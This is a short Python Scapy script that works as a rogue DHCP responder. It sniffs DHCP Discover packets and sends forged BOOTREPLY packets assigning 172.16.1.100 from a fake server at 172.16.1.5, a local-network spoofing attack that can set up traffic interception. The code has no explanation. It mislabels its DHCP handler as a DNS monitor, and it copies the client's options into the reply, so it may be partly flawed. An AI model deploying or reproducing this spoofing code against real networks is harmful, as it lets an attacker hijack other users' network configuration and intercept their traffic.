#!/usr/bin/python
from scapy.all import *

def dnsMonitorCallBack(pkt):
    if pkt.haslayer(DHCP) and pkt[DHCP].options[0][1] == 1:
        packet = NewPacketDHCP(pkt)
        sendp(packet)

def NewPacketDHCP(pkt):
    packet = Ether(src=pkt[Ether].dst, dst=pkt[Ether].src)/\
             IP(version=pkt[IP].version, ihl=pkt[IP].ihl, proto="udp",src="172.16.1.5", dst="172.16.1.100") / \
             UDP(sport=pkt[UDP].dport, dport=pkt[UDP].sport) / \
             BOOTP(op="BOOTREPLY", yiaddr="172.16.1.100", giaddr="172.16.1.5",chaddr=pkt[BOOTP].chaddr, sname=pkt[BOOTP].sname, file=pkt[BOOTP].file, options=pkt[BOOTP].options)
    return packet


sniff(prn=dnsMonitorCallBack)